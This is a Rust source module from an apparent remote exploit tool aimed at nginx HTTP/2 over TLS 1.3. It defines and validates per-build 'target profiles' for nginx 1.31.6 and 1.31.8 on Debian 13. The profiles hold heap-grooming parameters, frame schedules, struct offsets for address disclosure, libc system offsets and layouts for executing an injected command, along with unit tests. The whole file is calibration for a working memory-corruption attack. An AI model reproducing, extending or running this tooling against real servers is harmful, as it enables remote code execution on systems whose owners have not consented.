//! Target profiles: build-specific calibration that must not be guessed.
//!
//! The JSON is the reference exploit's schema 2, validated on load. Only the
//! `x86-64-glibc-evex-v1` backend is implemented.

use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};

pub const SUPPORTED_BACKEND: &str = "x86-64-glibc-evex-v1";

const BUILTIN_1318: &str = include_str!("profiles/golden-nginx-1.31.8-debian13-amd64.json");
const BUILTIN_1316: &str = include_str!("profiles/golden-nginx-1.31.6-debian13-amd64.json");

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Profile {
    pub schema: u32,
    pub name: String,
    pub calibration: Calibration,
    pub target: Target,
    pub fingerprint: Fingerprint,
    pub http: Http,
    pub transport: Transport,
    pub heap: Heap,
    pub libc: Libc,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source: Option<String>,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Calibration {
    pub status: String,
    pub backend: String,
    pub evidence: String,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Target {
    pub nginx_version: String,
    pub nginx_build_id: String,
    pub nginx_sha256: String,
    pub architecture: String,
    pub endianness: String,
    pub pointer_bytes: u64,
    pub libc: String,
    pub libc_build_id: String,
    pub libc_sha256: String,
    pub openssl_built_against: String,
    pub openssl_runtime: String,
    pub tls: String,
    pub worker_count: u64,
    pub worker_connections: u64,
    pub keepalive_requests: u64,
    pub keepalive_time_seconds: u64,
    pub send_timeout_seconds: u64,
    pub client_header_timeout_seconds: u64,
    pub http2_enabled: bool,
    pub http2_pool_size_bytes: u64,
    pub http2_receive_buffer_bytes: u64,
    pub http2_stream_index_entries: u64,
    pub ssl_buffer_size_bytes: u64,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Fingerprint {
    pub server_header: String,
    pub http2_settings: Vec<(u16, u32)>,
    pub nginx_image_pointer_deltas: Vec<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub http2_send_chain_delta: Option<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub resolver_timeout_delta: Option<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub destroy_pool_delta: Option<i64>,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Http {
    pub primary_path: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source_path: Option<String>,
    pub initial_request_count: u64,
    pub release_range_start: i64,
    pub release_range_end: i64,
    pub one_byte_range_start: i64,
    pub layout_range_start: i64,
    pub layout_range_end: i64,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Transport {
    pub tcp_max_segment_bytes: u64,
    pub tcp_initial_receive_window_bytes: i32,
    pub tcp_backpressure_window_bytes: i32,
    pub bootstrap_application_bytes: u64,
    pub bootstrap_key_updates: u64,
    pub bootstrap_alignment_modulus: u64,
    pub bootstrap_alignment_remainder: u64,
    pub carrier_frame_payload_bytes: u64,
    pub carrier_frames: u64,
    pub carrier_frames_per_request: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub carrier_filler_hex: Option<String>,
    pub window_owner_count: u64,
    pub negative_distance: u64,
    pub release_increment: u64,
    pub auxiliary_count: u64,
    pub predecessor_pin_count: u64,
    pub trigger_ping_count: u64,
    pub trigger_settings_count: u64,
    pub http2_output_chunk_bytes: u64,
    pub disclosure_frame_bytes: Vec<usize>,
    pub disclosure_capture_bytes: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Heap {
    pub warm_value_bytes: usize,
    pub hpack_dynamic_table_bytes: usize,
    pub warm_indexed_name: String,
    pub warm_indexed_value: String,
    pub auxiliary_indexed_name: String,
    pub auxiliary_indexed_value: String,
    pub auxiliary_incomplete_tail_bytes: usize,
    pub layout_header_name_index: usize,
    pub auxiliary_pin_value_bytes: usize,
    pub auxiliary_pin_fields: usize,
    pub auxiliary_pin_huffman_symbol: String,
    pub mirror_literal_count: usize,
    pub mirror_reference_count: usize,
    pub mirror_reference_index: usize,
    pub blocker_value_bytes: usize,
    pub blocker_fields: usize,
    pub drain_value_bytes: usize,
    pub final_value_bytes: usize,
    pub layout_huffman_symbol: String,
    pub holder_value_bytes: usize,
    pub holder_fields: usize,
    pub holder_chunk_bytes: u64,
    pub holder_chunk_size_word: u64,
    pub holder_pointer_adjustment: u64,
    pub holder_size_to_pool_bytes: u64,
    pub holder_user_to_pool_bytes: u64,
    pub holder_marker_offset: usize,
    pub holder_marker_bytes: usize,
    pub adaptive_value_bytes: usize,
    pub adaptive_fields: usize,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source_groom_streams: Option<usize>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source_groom_value_bytes: Option<usize>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source_groom_pattern: Option<String>,
    pub overlap_prefix_bytes: usize,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub victim_chunk_size_word: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub deferred_execution: Option<Deferred>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub address_disclosure: Option<AddressDisclosure>,
    pub pool_user_bytes: u64,
    pub pool_stub_bytes: usize,
    pub pool_minimum_data_offset: u64,
    pub pool_field_offsets: PoolOffsets,
    pub chunk_field_offsets: ChunkOffsets,
    pub cleanup_record_offsets: CleanupOffsets,
    pub callback_command_offset: usize,
    pub command_max_bytes: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Deferred {
    pub value_bytes: usize,
    pub fields: usize,
    pub cleanup_record_offset: usize,
    pub resolver_handler_offset: usize,
    pub settle_seconds: f64,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct AddressDisclosure {
    pub request: RequestAbi,
    pub copy_context: SizedAbi<CopyContextFields>,
    pub connection: SizedAbi<ConnectionFields>,
    pub event: SizedAbi<EventFields>,
    pub stream: FieldsAbi<StreamFields>,
    pub chain: ChainAbi,
    pub pool_extra_fields: PoolExtra,
    pub holder_offsets: HolderOffsets,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct SizedAbi<F> {
    pub bytes: usize,
    pub fields: F,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct FieldsAbi<F> {
    pub fields: F,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct RequestAbi {
    pub bytes: usize,
    pub fields: RequestFields,
    pub zero_qwords: Vec<usize>,
    pub flag_bytes: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct RequestFields {
    pub connection: usize,
    pub context: usize,
    pub read_handler: usize,
    pub write_handler: usize,
    pub pool: usize,
    pub count: usize,
    #[serde(rename = "self")]
    pub self_ptr: usize,
    pub stream: usize,
    pub flags: usize,
    pub buffered: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct CopyContextFields {
    pub free: usize,
    pub busy: usize,
    pub out: usize,
    pub allocated: usize,
    pub tag: usize,
    pub last_out: usize,
    pub last: usize,
    pub pool: usize,
    pub filter_ctx: usize,
    pub request: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct ConnectionFields {
    pub data: usize,
    pub write: usize,
    pub send_chain: usize,
    pub log: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct EventFields {
    pub data: usize,
    pub flags: usize,
    pub handler: usize,
    pub log: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct StreamFields {
    pub request: usize,
    pub connection: usize,
    pub node: usize,
    pub send_window: usize,
    pub connection_window: usize,
    pub pool: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct ChainAbi {
    pub item_bytes: usize,
    pub buffer_offset: usize,
    pub fields: ChainFields,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct ChainFields {
    pub pos: usize,
    pub last: usize,
    pub start: usize,
    pub end: usize,
    pub flags: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct PoolExtra {
    pub max: usize,
    pub chain: usize,
    pub log: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct HolderOffsets {
    pub request: usize,
    pub stream: usize,
    pub node: usize,
    pub chain: usize,
    pub context: usize,
    pub copy_context: usize,
    pub pool: usize,
    pub pool_data: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct PoolOffsets {
    pub last: usize,
    pub end: usize,
    pub next: usize,
    pub current: usize,
    pub large: usize,
    pub cleanup: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct ChunkOffsets {
    pub size: usize,
    pub forward: usize,
    pub backward: usize,
    pub chunk_address: usize,
    pub chunk_address_duplicate: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct CleanupOffsets {
    pub handler: usize,
    pub data: usize,
    pub next: usize,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq)]
pub struct Libc {
    pub memcpy_runtime_offset: u64,
    pub memcpy_variant: String,
    pub memcpy_vector_bytes: usize,
    pub memcpy_source_head_bytes: usize,
    pub required_cpu_flags: Vec<String>,
    pub arena_pointer_offsets: Vec<u64>,
    pub base_alignment: u64,
    pub heap_pointer_alignment: u64,
    pub heap_pointer_min: u64,
    pub heap_pointer_max: u64,
    pub arena_pointer_min: u64,
    pub arena_pointer_max: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub system_offset: Option<u64>,
}

impl Profile {
    pub fn is_address_directed(&self) -> bool {
        self.fingerprint.http2_send_chain_delta.is_some()
    }
}

pub fn load_builtins() -> Result<Vec<Profile>> {
    let mut profiles = Vec::new();
    for text in [BUILTIN_1318, BUILTIN_1316] {
        let mut profile: Profile = serde_json::from_str(text).context("embedded profile JSON")?;
        validate(&mut profile)?;
        profiles.push(profile);
    }
    Ok(profiles)
}

pub fn load_named(name: &str) -> Result<Profile> {
    if std::path::Path::new(name).is_file() {
        let text = std::fs::read_to_string(name)
            .with_context(|| format!("could not read profile {name}"))?;
        let mut profile: Profile = serde_json::from_str(&text)
            .with_context(|| format!("could not parse profile {name}"))?;
        profile.source = Some(name.to_string());
        validate(&mut profile)?;
        return Ok(profile);
    }
    load_builtins()?
        .into_iter()
        .find(|profile| profile.name == name)
        .with_context(|| format!("no built-in profile named {name}"))
}

fn require(condition: bool, message: impl Into<String>) -> Result<()> {
    if condition {
        Ok(())
    } else {
        bail!("{}", message.into())
    }
}

/// Fail-closed validation, ported from the reference `_validate_profile`.
pub fn validate(profile: &mut Profile) -> Result<()> {
    require(profile.schema == 2, "unsupported profile schema")?;
    require(
        profile.calibration.status == "validated",
        "profile has not completed native and end-to-end calibration",
    )?;
    require(
        profile.calibration.backend == SUPPORTED_BACKEND,
        format!(
            "unsupported exploit backend {:?}; expected {SUPPORTED_BACKEND}",
            profile.calibration.backend
        ),
    )?;
    require(
        profile.target.architecture == "x86-64"
            && profile.target.endianness == "little"
            && profile.target.pointer_bytes == 8
            && profile.target.tls == "1.3",
        "this implementation requires x86-64 little-endian TLS 1.3 targets",
    )?;
    require(profile.target.http2_enabled, "profile requires an HTTP/2 TLS listener")?;
    require(!profile.fingerprint.http2_settings.is_empty(), "profile has no HTTP/2 settings")?;
    require(
        profile.fingerprint.nginx_image_pointer_deltas.len() >= 3
            && profile.fingerprint.nginx_image_pointer_deltas.contains(&0)
            && {
                let mut unique = profile.fingerprint.nginx_image_pointer_deltas.clone();
                unique.sort_unstable();
                unique.dedup();
                unique.len() == profile.fingerprint.nginx_image_pointer_deltas.len()
            },
        "profile needs three unique relative Nginx pointer deltas",
    )?;
    for (_id, value) in &profile.fingerprint.http2_settings {
        let _ = value; // u32 by type; ids are validated as unique below
    }
    {
        let mut ids: Vec<u16> = profile.fingerprint.http2_settings.iter().map(|p| p.0).collect();
        ids.sort_unstable();
        ids.dedup();
        require(
            ids.len() == profile.fingerprint.http2_settings.len(),
            "profile HTTP/2 settings contain duplicate ids",
        )?;
    }

    let deferred = profile.heap.deferred_execution.clone();
    if deferred.is_some() {
        require(
            profile.fingerprint.resolver_timeout_delta.is_some()
                && profile.fingerprint.destroy_pool_delta.is_some(),
            "deferred execution needs Nginx callback deltas",
        )?;
    }
    if profile.is_address_directed() {
        require(
            profile.fingerprint.http2_send_chain_delta.unwrap_or(0) > 0,
            "address-directed profiles need http2_send_chain_delta",
        )?;
        require(
            profile.heap.address_disclosure.is_some(),
            "address-directed profiles require heap.address_disclosure",
        )?;
        require(deferred.is_some(), "address-directed profiles require deferred execution")?;
    } else {
        require(profile.libc.system_offset.is_some(), "legacy profile needs libc.system_offset")?;
    }

    if let Some(abi) = &profile.heap.address_disclosure {
        require(abi.request.flag_bytes >= 4, "request flag_bytes is invalid")?;
        require(
            abi.request.fields.flags + abi.request.flag_bytes <= abi.request.bytes,
            "request flags exceed the request object",
        )?;
        for offset in &abi.request.zero_qwords {
            require(
                offset + 8 <= abi.request.bytes,
                "request zero_qword exceeds the request object",
            )?;
        }
        require(
            abi.chain.buffer_offset
                + [abi.chain.fields.pos, abi.chain.fields.last, abi.chain.fields.start,
                   abi.chain.fields.end, abi.chain.fields.flags]
                    .into_iter()
                    .max()
                    .unwrap_or(0)
                + 8
                <= abi.chain.item_bytes,
            "chain geometry is invalid",
        )?;
        let placements = &abi.holder_offsets;
        require(
            placements.request + abi.request.bytes + abi.connection.bytes + abi.event.bytes
                <= placements.stream,
            "address disclosure placements overlap",
        )?;
        require(
            placements.copy_context + abi.copy_context.bytes <= placements.pool,
            "copy-context placement overlaps the pool",
        )?;
        require(
            placements.pool_data < profile.heap.holder_value_bytes,
            "pool data starts outside the holder",
        )?;
    }
    if let Some(deferred) = &deferred {
        require(
            deferred.value_bytes == profile.heap.pool_stub_bytes
                && deferred.fields >= 2
                && profile.heap.pool_field_offsets.cleanup + 8 <= deferred.value_bytes
                && deferred.cleanup_record_offset + 24 <= deferred.resolver_handler_offset
                && deferred.resolver_handler_offset + 8 <= deferred.value_bytes
                && deferred.settle_seconds > 0.0,
            "profile deferred execution layout relationships are invalid",
        )?;
    }

    let transport = &profile.transport;
    let heap = &profile.heap;
    let http = &profile.http;
    require(
        http.release_range_start <= http.release_range_end
            && http.layout_range_start <= http.layout_range_end
            && !http.primary_path.is_empty()
            && http.primary_path.starts_with('/')
            && !http.primary_path.contains('?')
            && !http.primary_path.contains('#'),
        "profile HTTP path or Range relationships are invalid",
    )?;
    require(
        transport.carrier_frames_per_request > 0
            && transport.carrier_frames % transport.carrier_frames_per_request == 0
            && transport.carrier_frame_payload_bytes <= 0x00ff_ffff
            && matches!(transport.carrier_filler_hex.as_deref(), None | Some("20") | Some("3f808000")),
        "profile carrier framing is invalid",
    )?;
    require(
        transport.bootstrap_alignment_remainder < transport.bootstrap_alignment_modulus,
        "profile bootstrap alignment is invalid",
    )?;
    let frames_total: usize = transport.disclosure_frame_bytes.iter().sum();
    require(
        frames_total as u64 == transport.release_increment
            && transport.negative_distance + 1 == transport.release_increment
            && transport.disclosure_capture_bytes >= frames_total + 9 * transport.disclosure_frame_bytes.len()
            && transport
                .disclosure_frame_bytes
                .iter()
                .all(|size| *size as u64 <= transport.http2_output_chunk_bytes)
            && transport
                .disclosure_frame_bytes
                .split_last()
                .map(|(_, head)| {
                    head.iter().all(|size| *size as u64 == transport.http2_output_chunk_bytes)
                })
                .unwrap_or(false),
        "profile disclosure frames disagree with the release increment",
    )?;
    require(
        heap.adaptive_value_bytes == heap.overlap_prefix_bytes + heap.pool_stub_bytes
            && heap.holder_chunk_size_word & !7 == heap.holder_chunk_bytes
            && heap.holder_marker_offset + heap.holder_marker_bytes <= heap.holder_size_to_pool_bytes as usize
            && heap.pool_field_offsets.cleanup + 8 <= heap.pool_stub_bytes
            && heap.callback_command_offset + heap.command_max_bytes + 1 <= heap.holder_value_bytes
            && transport.auxiliary_count >= profile.target.worker_count
            && profile.target.worker_connections >= transport.auxiliary_count + 2
            && profile.libc.heap_pointer_min < profile.libc.heap_pointer_max
            && profile.libc.arena_pointer_min < profile.libc.arena_pointer_max,
        "profile layout relationships are invalid",
    )?;
    require(
        heap.pool_stub_bytes >= heap.pool_minimum_data_offset as usize
            && heap.pool_user_bytes >= heap.pool_minimum_data_offset,
        "profile pool geometry is invalid",
    )?;
    let source_grooms = heap.source_groom_streams.unwrap_or(0) as u64;
    let requests = http.initial_request_count
        + 10
        + transport.carrier_frames / transport.carrier_frames_per_request
        + transport.window_owner_count
        + transport.predecessor_pin_count
        + source_grooms;
    require(
        requests <= profile.target.keepalive_requests,
        "profile schedule exceeds target keepalive_requests",
    )?;
    let advertised = |id: u16, default: u32| {
        profile
            .fingerprint
            .http2_settings
            .iter()
            .find(|pair| pair.0 == id)
            .map(|pair| pair.1)
            .unwrap_or(default)
    };
    require(
        advertised(3, u32::MAX) as u64
            >= (http.initial_request_count - 2).max(transport.predecessor_pin_count + 4)
            && advertised(5, 16384) as u64 >= transport.carrier_frame_payload_bytes,
        "profile remote SETTINGS cannot carry the exploit schedule",
    )?;
    Ok(())
}

/// Only state that must agree before the first leak selects a build.
pub fn schedule_key(profile: &Profile) -> String {
    let mut p = profile.clone();
    p.source = None;
    p.name.clear();
    p.calibration = Calibration {
        status: String::new(),
        backend: String::new(),
        evidence: String::new(),
    };
    for field in [
        &mut p.target.nginx_version,
        &mut p.target.nginx_build_id,
        &mut p.target.nginx_sha256,
        &mut p.target.libc,
        &mut p.target.libc_build_id,
        &mut p.target.libc_sha256,
        &mut p.target.openssl_built_against,
        &mut p.target.openssl_runtime,
        &mut p.fingerprint.server_header,
    ] {
        field.clear();
    }
    p.fingerprint.http2_send_chain_delta = None;
    p.fingerprint.resolver_timeout_delta = None;
    p.fingerprint.destroy_pool_delta = None;
    p.heap.address_disclosure = None;
    p.libc.system_offset = None;
    p.libc.arena_pointer_offsets.clear();
    serde_json::to_string(&p).expect("profile serializes")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn builtin_1318() -> Profile {
        load_builtins().unwrap().into_iter().find(|p| p.name.contains("1.31.8")).unwrap()
    }

    #[test]
    fn embedded_profiles_load_and_validate() {
        let profiles = load_builtins().unwrap();
        assert_eq!(profiles.len(), 2);
        let legacy = profiles.iter().find(|p| p.name.contains("1.31.6")).unwrap();
        assert!(legacy.libc.system_offset.is_some());
        assert!(!legacy.is_address_directed());
        let modern = profiles.iter().find(|p| p.name.contains("1.31.8")).unwrap();
        assert!(modern.libc.system_offset.is_none());
        assert!(modern.is_address_directed());
        assert_eq!(modern.transport.disclosure_frame_bytes, vec![8192, 6201]);
        assert_eq!(modern.http.initial_request_count, 74);
    }

    #[test]
    fn rejects_contradictory_release() {
        let mut profile = builtin_1318();
        profile.transport.release_increment += 1;
        assert!(validate(&mut profile).is_err());
    }

    #[test]
    fn rejects_address_directed_without_deferred() {
        let mut profile = builtin_1318();
        profile.heap.deferred_execution = None;
        assert!(validate(&mut profile).is_err());
    }

    #[test]
    fn schedule_key_ignores_identity_and_keeps_transport() {
        let mut a = builtin_1318();
        let key = schedule_key(&a);
        a.target.nginx_sha256 = "different".into();
        a.fingerprint.server_header = "nginx/other".into();
        a.heap.address_disclosure = None;
        assert_eq!(schedule_key(&a), key);
        a.transport.negative_distance += 1;
        assert_ne!(schedule_key(&a), key);
    }

    #[test]
    fn loads_profile_by_path() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("src/profiles/golden-nginx-1.31.8-debian13-amd64.json");
        let profile = load_named(path.to_str().unwrap()).unwrap();
        assert!(profile.is_address_directed());
        assert_eq!(profile.target.nginx_version, "1.31.8");
    }
}
